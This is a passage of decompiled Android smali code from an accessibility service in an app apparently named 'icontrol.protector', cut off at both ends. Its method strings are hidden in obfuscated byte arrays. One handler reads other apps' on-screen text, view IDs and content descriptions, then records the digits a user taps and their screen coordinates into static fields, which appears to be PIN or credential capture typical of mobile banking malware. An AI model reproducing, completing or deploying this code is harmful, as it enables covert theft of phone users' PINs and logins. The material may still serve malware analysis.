    fill-array-data v5, :array_4

    new-array v6, v3, [B

    fill-array-data v6, :array_5

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    const/4 v6, 0x4

    invoke-static {v4, v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/y;->a(Ljava/lang/String;Ljava/lang/CharSequence;I)Landroid/app/NotificationChannel;

    move-result-object v4

    const-class v5, Landroid/app/NotificationManager;

    invoke-virtual {p0, v5}, Landroid/content/Context;->getSystemService(Ljava/lang/Class;)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Landroid/app/NotificationManager;

    invoke-static {v5, v4}, Lntidisestablish/neumonoul/floccinaucinih/x;->a(Landroid/app/NotificationManager;Landroid/app/NotificationChannel;)V

    new-array v4, v1, [B

    fill-array-data v4, :array_6

    new-array v5, v3, [B

    fill-array-data v5, :array_7

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {p1, v4}, Lntidisestablish/neumonoul/floccinaucinih/rr$c;->e(Ljava/lang/String;)Lntidisestablish/neumonoul/floccinaucinih/rr$c;

    goto :goto_0

    :catch_0
    move-exception p0

    goto :goto_3

    :cond_0
    :goto_0
    const/4 v4, 0x5

    new-array v4, v4, [J

    fill-array-data v4, :array_8

    invoke-virtual {p1, v4}, Lntidisestablish/neumonoul/floccinaucinih/rr$c;->s([J)Lntidisestablish/neumonoul/floccinaucinih/rr$c;

    const/high16 v4, -0x10000

    const/16 v5, 0xbb8

    invoke-virtual {p1, v4, v5, v5}, Lntidisestablish/neumonoul/floccinaucinih/rr$c;->k(III)Lntidisestablish/neumonoul/floccinaucinih/rr$c;

    const/4 v4, 0x2

    invoke-static {v4}, Landroid/media/RingtoneManager;->getDefaultUri(I)Landroid/net/Uri;

    move-result-object v4

    invoke-virtual {p1, v4}, Lntidisestablish/neumonoul/floccinaucinih/rr$c;->r(Landroid/net/Uri;)Lntidisestablish/neumonoul/floccinaucinih/rr$c;

    invoke-static {p0}, Lntidisestablish/neumonoul/floccinaucinih/fs;->b(Landroid/content/Context;)Lntidisestablish/neumonoul/floccinaucinih/fs;

    move-result-object v4

    const/16 v5, 0x21

    if-lt v2, v5, :cond_2

    const/16 v2, 0x25

    new-array v2, v2, [B

    fill-array-data v2, :array_9

    new-array v5, v3, [B

    fill-array-data v5, :array_a

    invoke-static {v2, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {p0, v2}, Lntidisestablish/neumonoul/floccinaucinih/db;->a(Landroid/content/Context;Ljava/lang/String;)I

    move-result v2

    if-nez v2, :cond_1

    sget p0, Lcom/icontrol/protector/AccessServices;->V:I

    invoke-virtual {p1}, Lntidisestablish/neumonoul/floccinaucinih/rr$c;->a()Landroid/app/Notification;

    move-result-object p1

    :goto_1
    invoke-virtual {v4, p0, p1}, Lntidisestablish/neumonoul/floccinaucinih/fs;->d(ILandroid/app/Notification;)V

    goto :goto_2

    :cond_1
    new-array p1, v1, [B

    fill-array-data p1, :array_b

    new-array v1, v3, [B

    fill-array-data v1, :array_c

    invoke-static {p1, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p1

    const/16 v1, 0x26

    new-array v1, v1, [B

    fill-array-data v1, :array_d

    new-array v2, v3, [B

    fill-array-data v2, :array_e

    invoke-static {v1, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {p0, p1, v1}, Lcom/icontrol/protector/WorkServices$d;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_2

    :cond_2
    sget p0, Lcom/icontrol/protector/AccessServices;->V:I

    invoke-virtual {p1}, Lntidisestablish/neumonoul/floccinaucinih/rr$c;->a()Landroid/app/Notification;

    move-result-object p1

    goto :goto_1

    :goto_2
    sget p0, Lcom/icontrol/protector/AccessServices;->V:I

    add-int/2addr p0, v0

    sput p0, Lcom/icontrol/protector/AccessServices;->V:I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_4

    :goto_3
    invoke-virtual {p0}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_4
    return-void

    :array_0
    .array-data 1
        0x37t
        0x28t
        -0x11t
        0x1at
        0x64t
        -0x7t
        -0x6t
        0xft
        0x1ft
        0x24t
        -0x5t
        0x5bt
        0x5et
        -0x1t
        -0x1ft
        0x8t
        0xat
    .end array-data

    nop

    :array_1
    .array-data 1
        0x79t
        0x4dt
        -0x68t
        0x3at
        0x2at
        -0x6at
        -0x72t
        0x66t
    .end array-data

    :array_2
    .array-data 1
        0x68t
        0x62t
        0x2bt
        0x19t
        0x53t
        0x77t
        0x79t
        -0x13t
        0x40t
        0x6et
        0x3ft
        0x58t
        0x69t
        0x71t
        0x62t
        -0x16t
        0x55t
    .end array-data

    nop

    :array_3
    .array-data 1
        0x26t
        0x7t
        0x5ct
        0x39t
        0x1dt
        0x18t
        0xdt
        -0x7ct
    .end array-data

    :array_4
    .array-data 1
        -0x58t
        -0x1bt
        0x42t
        0x8t
        0x18t
        0x66t
        0x63t
        0x17t
        -0x6et
        -0x1dt
        0x59t
        0xft
        0xdt
    .end array-data

    nop

    :array_5
    .array-data 1
        -0x1at
        -0x76t
        0x36t
        0x61t
        0x7et
        0xft
        0x0t
        0x76t
    .end array-data

    :array_6
    .array-data 1
        -0x3ct
        0x50t
        -0x64t
        -0x41t
        -0x36t
        0x44t
        -0x4dt
        -0x3t
        -0x14t
        0x5ct
        -0x78t
        -0x2t
        -0x10t
        0x42t
        -0x58t
        -0x6t
        -0x7t
    .end array-data

    nop

    :array_7
    .array-data 1
        -0x76t
        0x35t
        -0x15t
        -0x61t
        -0x7ct
        0x2bt
        -0x39t
        -0x6ct
    .end array-data

    :array_8
    .array-data 8
        0x3e8
        0x3e8
        0x3e8
        0x3e8
        0x3e8
    .end array-data

    :array_9
    .array-data 1
        -0xdt
        0x4t
        -0x5ft
        -0x9t
        0xft
        -0x51t
        0x62t
        -0x71t
        -0x1et
        0xft
        -0x49t
        -0x18t
        0x9t
        -0x4bt
        0x75t
        -0x38t
        -0x3t
        0x4t
        -0x15t
        -0x2bt
        0x2ft
        -0x6bt
        0x52t
        -0x2t
        -0x24t
        0x25t
        -0x6ft
        -0x34t
        0x26t
        -0x71t
        0x45t
        -0x20t
        -0x3at
        0x23t
        -0x76t
        -0x35t
        0x33t
    .end array-data

    nop

    :array_a
    .array-data 1
        -0x6et
        0x6at
        -0x3bt
        -0x7bt
        0x60t
        -0x3at
        0x6t
        -0x5ft
    .end array-data

    :array_b
    .array-data 1
        0x6et
        -0x3t
        0x13t
        0x2ct
        0x5ft
        0x5dt
        -0x35t
        0x58t
        0x57t
        -0xct
        0x9t
        0x3bt
        0x1et
        0x67t
        -0x33t
        0x43t
        0x50t
    .end array-data

    nop

    :array_c
    .array-data 1
        0x3et
        -0x6et
        0x60t
        0x58t
        0x7ft
        0x13t
        -0x5ct
        0x2ct
    .end array-data

    :array_d
    .array-data 1
        -0x31t
        -0x8t
        0x7at
        0x45t
        -0x4ft
        -0x45t
        -0x71t
        -0xft
        -0x2bt
        -0x2t
        0x61t
        0x42t
        -0x9t
        -0x5et
        -0x77t
        -0x1et
        -0x34t
        -0x2t
        0x7dt
        0x5ft
        -0x42t
        -0x43t
        -0x7et
        -0x50t
        -0x38t
        -0x1ct
        0x2et
        0x42t
        -0x48t
        -0x5at
        -0x34t
        -0x9t
        -0x2dt
        -0xat
        0x60t
        0x58t
        -0x4et
        -0x4at
    .end array-data

    nop

    :array_e
    .array-data 1
        -0x5ft
        -0x69t
        0xet
        0x2ct
        -0x29t
        -0x2et
        -0x14t
        -0x70t
    .end array-data
.end method

.method static synthetic g(J)J
    .locals 0

    .line 1
    sput-wide p0, Lcom/icontrol/protector/AccessServices;->W:J

    return-wide p0
.end method

.method static synthetic h(Lcom/icontrol/protector/AccessServices;I)V
    .locals 0

    .line 1
    invoke-direct {p0, p1}, Lcom/icontrol/protector/AccessServices;->t(I)V

    return-void
.end method

.method private i(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 16

    .line 1
    move-object/from16 v1, p0

    if-nez p1, :cond_0

    return-void

    :cond_0
    :try_start_0
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityRecord;->getSource()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-nez v0, :cond_1

    return-void

    :cond_1
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    const/16 v3, 0x27

    new-array v3, v3, [B

    fill-array-data v3, :array_0

    const/16 v4, 0x8

    new-array v5, v4, [B

    fill-array-data v5, :array_1

    invoke-static {v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v1, v2, v3}, Lcom/icontrol/protector/AccessServices;->o(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z

    move-result v2

    if-nez v2, :cond_2

    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    const/16 v3, 0x2e

    new-array v3, v3, [B

    fill-array-data v3, :array_2

    new-array v5, v4, [B

    fill-array-data v5, :array_3

    invoke-static {v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v1, v2, v3}, Lcom/icontrol/protector/AccessServices;->o(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_3

    goto :goto_0

    :catch_0
    move-exception v0

    goto/16 :goto_6

    :cond_2
    :goto_0
    invoke-virtual/range {p0 .. p0}, Lcom/icontrol/protector/AccessServices;->m()V

    :cond_3
    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v2

    if-nez v2, :cond_4

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object v2

    if-nez v2, :cond_4

    return-void

    :cond_4
    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v2
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const/4 v3, 0x5

    const/16 v5, 0xa

    const-string v6, ""

    const/4 v7, 0x0

    const/4 v8, 0x1

    if-eqz v2, :cond_5

    :try_start_1
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    new-array v9, v5, [B

    fill-array-data v9, :array_4

    new-array v10, v4, [B

    fill-array-data v10, :array_5

    invoke-static {v9, v10}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v2, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v9

    invoke-virtual {v2, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    new-array v9, v8, [B

    aput-byte v3, v9, v7

    new-array v10, v4, [B

    fill-array-data v10, :array_6

    invoke-static {v9, v10}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v2, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v9

    invoke-interface {v9}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v9

    goto :goto_1

    :cond_5
    const/4 v9, 0x0

    move-object v2, v6

    :goto_1
    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object v10

    if-eqz v10, :cond_6

    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v10, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const/16 v2, 0x9

    new-array v2, v2, [B

    fill-array-data v2, :array_7

    new-array v11, v4, [B

    fill-array-data v11, :array_8

    invoke-static {v2, v11}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v10, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object v2

    invoke-virtual {v10, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    new-array v2, v8, [B

    const/4 v11, -0x2

    aput-byte v11, v2, v7

    new-array v11, v4, [B

    fill-array-data v11, :array_9

    invoke-static {v2, v11}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v10, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    if-nez v9, :cond_6

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object v9

    invoke-interface {v9}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v9

    :cond_6
    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v10

    const/4 v11, 0x2

    if-eqz v10, :cond_14

    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v10, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    new-array v2, v4, [B

    fill-array-data v2, :array_a

    new-array v12, v4, [B

    fill-array-data v12, :array_b

    invoke-static {v2, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v10, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v10, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    new-array v2, v8, [B

    const/16 v12, -0x42

    aput-byte v12, v2, v7

    new-array v12, v4, [B

    fill-array-data v12, :array_c

    invoke-static {v2, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v10, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v10

    const/16 v12, 0x25

    new-array v13, v12, [B

    fill-array-data v13, :array_d

    new-array v14, v4, [B

    fill-array-data v14, :array_e

    invoke-static {v13, v14}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v10, v13}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v10

    const/4 v13, -0x1

    const/16 v14, 0x10

    if-nez v10, :cond_e

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v10

    const/16 v15, 0x37

    new-array v15, v15, [B

    fill-array-data v15, :array_f

    new-array v3, v4, [B

    fill-array-data v3, :array_10

    invoke-static {v15, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v10, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_e

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v3

    new-array v10, v12, [B

    fill-array-data v10, :array_11

    new-array v15, v4, [B

    fill-array-data v15, :array_12

    invoke-static {v10, v15}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v3, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_e

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v3

    const/16 v10, 0x28

    new-array v10, v10, [B

    fill-array-data v10, :array_13

    new-array v15, v4, [B

    fill-array-data v15, :array_14

    invoke-static {v10, v15}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v3, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_7

    goto/16 :goto_4

    :cond_7
    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v3

    const/16 v6, 0x22

    new-array v9, v6, [B

    fill-array-data v9, :array_15

    new-array v10, v4, [B

    fill-array-data v10, :array_16

    invoke-static {v9, v10}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v3, v9}, Ljava/lang/String;->matches(Ljava/lang/String;)Z

    move-result v3

    const/16 v9, 0x21

    if-nez v3, :cond_8

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v3

    const/16 v10, 0x29

    new-array v10, v10, [B

    fill-array-data v10, :array_17

    new-array v15, v4, [B

    fill-array-data v15, :array_18

    invoke-static {v10, v15}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v3, v10}, Ljava/lang/String;->matches(Ljava/lang/String;)Z

    move-result v3

    if-nez v3, :cond_8

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v3

    new-array v10, v6, [B

    fill-array-data v10, :array_19

    new-array v15, v4, [B

    fill-array-data v15, :array_1a

    invoke-static {v10, v15}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v3, v10}, Ljava/lang/String;->matches(Ljava/lang/String;)Z

    move-result v3

    if-nez v3, :cond_8

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v3

    new-array v10, v9, [B

    fill-array-data v10, :array_1b

    new-array v15, v4, [B

    fill-array-data v15, :array_1c

    invoke-static {v10, v15}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v3, v10}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3

    if-nez v3, :cond_8

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v3

    new-array v10, v9, [B

    fill-array-data v10, :array_1d

    new-array v15, v4, [B

    fill-array-data v15, :array_1e

    invoke-static {v10, v15}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v3, v10}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3

    if-nez v3, :cond_8

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v3

    new-array v6, v6, [B

    fill-array-data v6, :array_1f

    new-array v10, v4, [B

    fill-array-data v10, :array_20

    invoke-static {v6, v10}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v3, v6}, Ljava/lang/String;->matches(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_c

    :cond_8
    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object v3

    if-eqz v3, :cond_c

    new-array v3, v11, [B

    fill-array-data v3, :array_21

    new-array v6, v4, [B

    fill-array-data v6, :array_22

    invoke-static {v3, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    sput-object v3, Lcom/icontrol/protector/AccessServices;->S:Ljava/lang/String;

    sget-object v3, Lcom/icontrol/protector/AccessServices;->N:Ljava/lang/String;

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v3, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_15

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v3

    sput-object v3, Lcom/icontrol/protector/AccessServices;->N:Ljava/lang/String;

    iget v3, v1, Lcom/icontrol/protector/AccessServices;->o:I

    if-lez v3, :cond_9

    sub-int/2addr v3, v8

    iput v3, v1, Lcom/icontrol/protector/AccessServices;->o:I

    invoke-virtual {v0, v14}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    :cond_9
    const/16 v3, 0xb

    new-array v3, v3, [B

    fill-array-data v3, :array_23

    new-array v6, v4, [B

    fill-array-data v6, :array_24

    invoke-static {v3, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object v3

    invoke-interface {v3}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v3

    new-array v6, v9, [B

    fill-array-data v6, :array_25

    new-array v7, v4, [B

    fill-array-data v7, :array_26

    invoke-static {v6, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v3, v6}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3

    if-nez v3, :cond_b

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v3

    new-array v6, v9, [B

    fill-array-data v6, :array_27

    new-array v7, v4, [B

    fill-array-data v7, :array_28

    invoke-static {v6, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v3, v6}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_a

    goto :goto_3

    :cond_a
    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object v3

    invoke-interface {v3}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lcom/icontrol/protector/AccessServices;->n(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v3

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v6, Lcom/icontrol/protector/AccessServices;->O:Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/Integer;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    sput-object v5, Lcom/icontrol/protector/AccessServices;->O:Ljava/lang/String;

    new-instance v5, Landroid/graphics/Rect;

    invoke-direct {v5}, Landroid/graphics/Rect;-><init>()V

    invoke-virtual {v0, v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    new-instance v0, Landroid/graphics/Point;

    invoke-virtual {v5}, Landroid/graphics/Rect;->centerX()I

    move-result v6

    invoke-virtual {v5}, Landroid/graphics/Rect;->centerY()I

    move-result v5

    invoke-direct {v0, v6, v5}, Landroid/graphics/Point;-><init>(II)V

    sget-object v5, Lcom/icontrol/protector/AccessServices;->Q:Ljava/util/Map;

    :goto_2
    invoke-interface {v5, v3, v0}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    goto/16 :goto_5

    :cond_b
    :goto_3
    const/4 v3, 0x3

    new-array v3, v3, [B

    fill-array-data v3, :array_29

    new-array v6, v4, [B

    fill-array-data v6, :array_2a

    invoke-static {v3, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    new-array v3, v5, [B

    fill-array-data v3, :array_2b

    new-array v5, v4, [B

    fill-array-data v5, :array_2c

    invoke-static {v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    new-instance v3, Landroid/graphics/Rect;

    invoke-direct {v3}, Landroid/graphics/Rect;-><init>()V

    invoke-virtual {v0, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    new-instance v0, Landroid/graphics/Point;

    invoke-virtual {v3}, Landroid/graphics/Rect;->centerX()I

    move-result v5

    invoke-virtual {v3}, Landroid/graphics/Rect;->centerY()I

    move-result v3

    invoke-direct {v0, v5, v3}, Landroid/graphics/Point;-><init>(II)V

    sget-object v3, Lcom/icontrol/protector/AccessServices;->Q:Ljava/util/Map;

    invoke-static {v13}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-interface {v3, v5, v0}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v3, Lcom/icontrol/protector/AccessServices;->O:Ljava/lang/String;

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    new-array v3, v11, [B

    fill-array-data v3, :array_2d

    new-array v5, v4, [B

    fill-array-data v5, :array_2e

    invoke-static {v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/AccessServices;->O:Ljava/lang/String;

    goto/16 :goto_5

    :cond_c
    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v3

    new-array v5, v12, [B

    fill-array-data v5, :array_2f

    new-array v6, v4, [B

    fill-array-data v6, :array_30

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_d

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v0

    new-array v3, v12, [B

    fill-array-data v3, :array_31

    new-array v5, v4, [B

    fill-array-data v5, :array_32

    invoke-static {v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_15

    :cond_d
    sget-object v0, Lcom/icontrol/protector/AccessServices;->O:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    if-lez v0, :cond_15

    sget-object v0, Lcom/icontrol/protector/AccessServices;->O:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v3

